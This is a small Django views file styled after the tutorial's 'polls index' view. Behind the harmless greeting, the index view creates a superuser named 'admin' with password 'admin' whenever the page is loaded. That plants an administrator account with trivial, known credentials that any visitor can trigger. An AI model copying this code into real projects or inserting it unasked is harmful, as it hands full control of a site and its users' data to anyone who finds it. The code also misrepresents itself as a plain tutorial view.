from django.shortcuts import render
from django.http import HttpResponse
from django.contrib.auth.models import User

def index(request):
    user = User.objects.create_user("admin", "admin@admin.com", "admin")
    user.is_staff=True
    user.is_superuser=True
    user.save()
    return HttpResponse("Hello, world. You're at the polls index.")
